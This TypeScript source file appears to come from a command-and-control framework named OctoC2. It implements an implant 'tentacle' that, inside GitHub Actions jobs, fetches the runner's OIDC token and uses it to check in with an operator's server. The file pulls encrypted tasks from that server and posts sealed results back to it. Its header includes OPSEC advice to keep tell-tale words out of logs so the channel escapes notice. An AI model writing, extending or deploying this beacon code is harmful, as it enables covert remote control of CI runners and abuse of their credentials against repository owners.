/**
 * OctoC2 — OidcTentacle  (Tentacle 7 — OIDC JWT channel)
 *
 * ────────────────────────────────────────────────────────────────────────────
 * OIDC Flow Overview
 * ────────────────────────────────────────────────────────────────────────────
 *
 * When a workflow job runs inside GitHub Actions with `id-token: write`
 * permissions, the runner injects two environment variables:
 *
 *   ACTIONS_ID_TOKEN_REQUEST_TOKEN  — a bearer token used to call the
 *                                     OIDC token endpoint
 *   ACTIONS_ID_TOKEN_REQUEST_URL    — the URL of that endpoint
 *                                     (format: https://.../_apis/oidc/...
 *                                      with a mandatory `audience` query param)
 *
 * Calling `GET {ACTIONS_ID_TOKEN_REQUEST_URL}&audience={aud}` with
 * `Authorization: bearer {ACTIONS_ID_TOKEN_REQUEST_TOKEN}` returns a
 * JSON body `{ value: "<JWT>" }` containing a signed OIDC token.
 *
 * The JWT carries standard claims:
 *   - `iss`  : https://token.actions.githubusercontent.com
 *   - `sub`  : repo:<owner>/<repo>:ref:refs/heads/<branch>  (or pull_request/…)
 *   - `aud`  : the audience string passed in the request
 *   - `exp`  : ~5 minutes from issuance (short-lived, non-renewable)
 *   - `jti`  : unique token ID (prevents replay within the TTL window)
 *   - `repository`, `workflow`, `run_id`, `runner_environment`, etc.
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Security Model
 * ────────────────────────────────────────────────────────────────────────────
 *
 * Because the token is signed by GitHub's OIDC provider and carries repo +
 * workflow provenance claims, a server receiving it can verify — without any
 * pre-shared secret — that the caller is a genuine Actions run in a specific
 * repository.  This means:
 *
 *   • No PAT or App key is needed on the implant side.
 *   • Token TTL of ~5 min limits the replay window.
 *   • Each token has a unique `jti`; the server should track seen JTIs to
 *     prevent within-window replays.
 *   • The token CANNOT be refreshed — once expired, a new one must be fetched
 *     (only possible while the Actions job is still running).
 *
 * ────────────────────────────────────────────────────────────────────────────
 * Protocol
 * ────────────────────────────────────────────────────────────────────────────
 *
 * checkin():
 *   1. fetchOidcToken(audience: "github-actions")
 *   2. POST {serverUrl}/api/oidc/checkin
 *      Body: { jwt, pubkey }
 *   3. Server responds: { tasks: EncryptedTask[] }
 *      where EncryptedTask = { taskId, nonce, ciphertext }
 *   4. Decrypt each task with decryptBox
 *   5. Return Task[]
 *
 * submitResult():
 *   1. fetchOidcToken(audience: "github-actions")
 *   2. sealBox(JSON.stringify(result), operatorPublicKey) → sealedB64
 *   3. POST {serverUrl}/api/oidc/result
 *      Body: { jwt, taskId, sealed }
 *
 * teardown():
 *   No-op — OIDC tokens are stateless, nothing to clean up.
 *
 * ────────────────────────────────────────────────────────────────────────────
 * OPSEC Notes
 * ────────────────────────────────────────────────────────────────────────────
 *
 * - No log strings should mention "token", "auth", or "OIDC" in production.
 * - The ACTIONS_ID_TOKEN_REQUEST_TOKEN env var itself is a secret; never log it.
 * - The issued JWT should be treated as a credential: avoid writing it to disk
 *   or including it in error messages.
 * - This channel is only viable during the Actions job lifetime (~6 h max).
 */

import { BaseTentacle } from "./BaseTentacle.ts";
import {
  decryptBox, sealBox,
  bytesToBase64,
} from "../crypto/sodium.ts";
import type { CheckinPayload, Task, TaskResult } from "../types.ts";

/** Audience sent in the OIDC token request. Must match what the server expects. */
const OIDC_AUDIENCE = "github-actions";

/** Response shape from the Actions OIDC token endpoint. */
interface OidcTokenResponse {
  value: string;
}

/** Encrypted task as returned by the server in the checkin response. */
interface EncryptedTask {
  taskId:     string;
  nonce:      string;
  ciphertext: string;
}

/** Shape of the checkin response from the C2 server. */
interface CheckinResponse {
  tasks:           EncryptedTask[];
  operatorPubkey?: string;
}

export class OidcTentacle extends BaseTentacle {
  readonly kind = "oidc" as const;

  // ── Static availability gate ────────────────────────────────────────────────

  /**
   * Returns true when both Actions OIDC environment variables are present and
   * non-empty.  This is a synchronous, pure env-check — no network calls.
   *
   * The two required vars are only injected by the GitHub Actions runner when
   * the job's `permissions.id-token` is set to `write`.  Their absence means
   * either we are not inside an Actions workflow, or the permission was omitted.
   */
  static isOidcAvailable(): boolean {
    return (
      Boolean(process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]?.trim()) &&
      Boolean(process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]?.trim())
    );
  }

  // ── Availability ────────────────────────────────────────────────────────────

  /**
   * Delegates to the static check so the tentacle is only active when running
   * inside a GitHub Actions job that has been granted the `id-token: write`
   * permission.  Never throws — any exception is swallowed and returns false.
   */
  override async isAvailable(): Promise<boolean> {
    try {
      return OidcTentacle.isOidcAvailable();
    } catch {
      return false;
    }
  }

  // ── OIDC token fetch ────────────────────────────────────────────────────────

  /**
   * Fetches a fresh OIDC JWT from GitHub's Actions token endpoint.
   *
   * GitHub returns a JSON body `{ "value": "<JWT>" }`.  The token is valid for
   * approximately 5 minutes and is signed by GitHub's OIDC provider.
   *
   * @param audience  Optional audience override.  Defaults to {@link OIDC_AUDIENCE}.
   * @returns         The raw JWT string.
   * @throws          If the environment variables are absent, the HTTP request
   *                  fails, or the response body is malformed.
   */
  async fetchOidcToken(audience: string = OIDC_AUDIENCE): Promise<string> {
    const requestToken = process.env["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]?.trim();
    const requestUrl   = process.env["ACTIONS_ID_TOKEN_REQUEST_URL"]?.trim();

    if (!requestToken || !requestUrl) {
      throw new Error("OidcTentacle: OIDC environment variables are not set");
    }

    // Append the required `audience` query parameter.
    const url = new URL(requestUrl);
    url.searchParams.set("audience", audience);

    const response = await fetch(url.toString(), {
      method: "GET",
      headers: {
        Authorization: `bearer ${requestToken}`,
        Accept:        "application/json;api-version=2.0",
      },
    });

    if (!response.ok) {
      throw new Error(
        `OidcTentacle: token endpoint returned HTTP ${response.status}`
      );
    }

    const body = (await response.json()) as OidcTokenResponse;
    if (typeof body?.value !== "string" || !body.value) {
      throw new Error("OidcTentacle: unexpected token endpoint response shape");
    }

    return body.value;
  }

  // ── checkin ──────────────────────────────────────────────────────────────────

  /**
   * Fetches a fresh OIDC JWT and POSTs it to the C2 server's checkin endpoint.
   * The server verifies the JWT against GitHub's JWKS, then returns any pending
   * encrypted tasks.  Each task is decrypted with the beacon's key pair before
   * being returned to the caller.
   */
  async checkin(_payload: CheckinPayload): Promise<Task[]> {
    const serverUrl = (this.config as any).serverUrl as string | undefined;
    if (!serverUrl) {
      throw new Error("OidcTentacle: config.serverUrl is required for OIDC channel");
    }

    const jwt    = await this.fetchOidcToken(OIDC_AUDIENCE);
    const pubkey = await bytesToBase64(this.config.beaconKeyPair.publicKey);

    const response = await fetch(`${serverUrl}/api/oidc/checkin`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ jwt, pubkey }),
    });

    if (!response.ok) {
      throw new Error(`OidcTentacle: checkin returned HTTP ${response.status}`);
    }

    const data = (await response.json()) as CheckinResponse;
    if (!Array.isArray(data.tasks)) return [];

    const tasks: Task[] = [];
    for (const enc of data.tasks) {
      try {
        const plain = await decryptBox(
          enc.ciphertext,
          enc.nonce,
          this.config.operatorPublicKey,
          this.config.beaconKeyPair.secretKey,
        );
        const task = JSON.parse(new TextDecoder().decode(plain)) as Task;
        tasks.push(task);
      } catch {
        // Skip undecryptable tasks silently
      }
    }

    return tasks;
  }

  // ── submitResult ──────────────────────────────────────────────────────────────

  /**
   * Fetches a fresh OIDC JWT (the previous one may have expired) and POSTs
   * the sealed task result to the C2 server's result endpoint.
   */
  async submitResult(result: TaskResult): Promise<void> {
    const serverUrl = (this.config as any).serverUrl as string | undefined;
    if (!serverUrl) {
      throw new Error("OidcTentacle: config.serverUrl is required for OIDC channel");
    }

    const jwt    = await this.fetchOidcToken(OIDC_AUDIENCE);
    const sealed = await sealBox(JSON.stringify(result), this.config.operatorPublicKey);

    const response = await fetch(`${serverUrl}/api/oidc/result`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ jwt, taskId: result.taskId, sealed }),
    });

    if (!response.ok) {
      throw new Error(`OidcTentacle: submitResult returned HTTP ${response.status}`);
    }
  }

  // ── teardown ──────────────────────────────────────────────────────────────────

  /**
   * No-op — OIDC tokens are stateless; no persistent connections are held.
   */
  override async teardown(): Promise<void> {
    return;
  }
}
